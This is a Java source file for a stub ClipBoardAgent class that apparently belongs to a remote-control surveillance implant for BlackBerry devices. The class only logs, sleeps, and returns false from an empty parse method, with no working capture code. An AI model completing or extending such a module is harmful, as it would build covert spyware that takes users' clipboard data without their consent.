package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class ClipBoardAgent extends Agent {
    static Debug debug = new Debug("ClipBoardAgent", DebugLevel.VERBOSE);

    public ClipBoardAgent(int agentStatus) {
        super(Agent.AGENT_CLIPBOARD, agentStatus, true);

    }

    protected ClipBoardAgent(int agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void agentRun() {
        debug.trace("run");
        this.sleepUntilStopped();

    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }
}
